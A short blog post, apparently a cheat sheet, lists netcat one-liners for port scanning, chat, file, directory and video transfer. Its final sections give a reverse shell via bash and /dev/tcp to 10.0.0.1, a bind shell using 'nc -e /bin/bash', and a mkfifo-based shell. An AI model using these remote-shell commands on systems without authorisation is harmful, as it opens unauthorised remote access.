---
layout: post
title: "Linux netcat examples"
description: ""
category: 
tags: [Linux]
---


### 端口扫描

nc -z -v -n 172.31.100.7 21-25

### Chat Server

Server: nc -l 1567

Client: nc 172.31.100.7 1567

### 文件传输

Server to Client: 

Server: nc -l 1567 < file.txt 

Client: nc -n 172.31.100.7 1567 > file.txt

Client to Server:

Server: nc -l 1567 > file.txt

Client: nc 172.31.100.23 1567 < file.txt

### 目录传输

Server: tar -cvf - dir_name | nc -l 1567

Client: nc -n 172.31.100.7 1567 | tar -xvf -

### 视频播放

Server: cat video.avi | nc -l 1567

Client: nc 172.31.100.7 1567 | mplayer -vo x11 -cache 3000 -

### Reverse Shell

nc -l -p 8080 -vvv

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

### Shell

nc -l 1567 -e /bin/bash -i

mkfifo /tmp/tmp\_fifo && cat /tmp/tmp\_fifo | /bin/sh -i 2>&1 | nc -l 1567 > /tmp/tmp\_fifo


